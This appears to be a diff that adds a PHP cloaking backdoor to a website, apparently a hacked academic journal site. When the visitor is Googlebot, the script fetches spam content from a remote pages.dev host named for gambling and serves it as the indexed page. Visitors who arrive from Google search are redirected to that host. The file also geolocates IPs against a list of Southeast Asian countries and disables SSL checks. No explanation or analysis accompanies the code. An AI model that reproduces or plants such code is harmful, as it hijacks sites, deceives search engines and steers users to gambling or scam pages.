@@ -1,0 +1,129 @@
+<?php
+ $target_countries = ['ID', 'KH', 'SG', 'MY', 'TH', 'LK'];
+ $manual_routes = [
+    '/index.php/ijodas' => [
+        'url_content'  => 'https://jurnalyoctobrain-slt4d-official.pages.dev/landing.txt',
+        'url_redirect' => 'https://jurnalyoctobrain-slt4d-official.pages.dev/',
+        'only_redirect_from_google' => true 
+    ],
+];
+function is_google_bot() {
+    $agents = array("googlebot", "google-amphtml", "google-site-verification", "googlebot-mobile", "google-inspectiontool", "googlebot-image", "mediapartners-google", "adsbot-google", "amphtml");
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    foreach ($agents as $agent) {
+        if (strpos($ua, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+function is_from_google() {
+    if (empty($_SERVER['HTTP_REFERER'])) {
+        return false;
+    }
+    $referer = parse_url($_SERVER['HTTP_REFERER']);
+    $host = strtolower($referer['host'] ?? '');
+    return (strpos($host, 'google.') !== false);
+}
+function get_client_ip() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    }
+    if (!empty($_SERVER['HTTP_X_REAL_IP'])) return trim($_SERVER['HTTP_X_REAL_IP']);
+    return $_SERVER['REMOTE_ADDR'] ?? '';
+}
+function get_country_code_by_ip($ip) {
+    static $cache = [];
+    if (isset($cache[$ip])) return $cache[$ip];    
+    $resp = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode,status");    
+    if (!$resp) return $cache[$ip] = '';    
+    $data = @json_decode($resp, true);
+    if (!is_array($data) || ($data['status'] ?? '') !== 'success') {
+        return $cache[$ip] = '';
+    }
+    return $cache[$ip] = strtoupper($data['countryCode'] ?? '');
+}
+function is_target_country($ip, $countries) {
+    $code = get_country_code_by_ip($ip);
+    return in_array($code, $countries);
+}
+function fetch_remote_content($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL            => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 10, // Timeout 10 detik
+            CURLOPT_CONNECTTIMEOUT => 5,  // Timeout koneksi 5 detik
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false, // Skip SSL verify (karena sering bermasalah di hosting)
+            CURLOPT_SSL_VERIFYHOST => 0,
+            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        ]);        
+        $result = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        if ($result !== false && $http_code == 200) {
+            return $result;
+        }
+    }
+    $context = stream_context_create([
+        'http' => [
+            'timeout' => 10,
+            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        ],
+        'ssl' => [
+            'verify_peer'      => false,
+            'verify_peer_name' => false,
+        ]
+    ]);    
+    $result = @file_get_contents($url, false, $context);    
+    if ($result !== false) {
+        return $result;
+    }
+    return false;
+}
+ $current_uri = rawurldecode(parse_url($_SERVER['REQUEST_URI'] ?? '', PHP_URL_PATH));
+if ($current_uri !== '/' && substr($current_uri, -1) === '/') {
+    $current_uri = substr($current_uri, 0, -1);
+}
+if (isset($manual_routes[$current_uri])) {
+    $route_config = $manual_routes[$current_uri];
+    if (is_google_bot()) {
+        header('HTTP/1.1 200 OK');
+        header('Content-Type: text/html; charset=utf-8');
+        header('X-Content-Type-Options: nosniff');        
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'];
+        $canonical_url = $protocol . '://' . $host . $current_uri . '/';
+        header("Link: <{$canonical_url}>; rel=\"canonical\"");        
+        header('Cache-Control: public, max-age=3600, must-revalidate');
+        $bot_content = fetch_remote_content($route_config['url_content']);          
+        if ($bot_content !== false) {
+            $meta_robots = '<meta name="robots" content="index, follow">';
+            $og_url = '<meta property="og:url" content="' . $canonical_url . '">'; 
+            if (strpos($bot_content, '</head>') !== false) {
+                $inject = "\n" . $meta_robots . "\n" . $og_url . "\n";
+                $bot_content = str_replace('</head>', $inject . '</head>', $bot_content);
+            }            
+            echo $bot_content;
+        } else {
+            header("Location: {$route_config['url_redirect']}", true, 301);
+            exit;
+        }
+        exit;
+    }
+    if (!empty($route_config['only_redirect_from_google'])) {
+        if (is_from_google()) {
+            header("Location: {$route_config['url_redirect']}", true, 301);
+            exit;
+        }
+    } else {
+        header("Location: {$route_config['url_redirect']}", true, 301);
+        exit;
+    }
+}
+?>
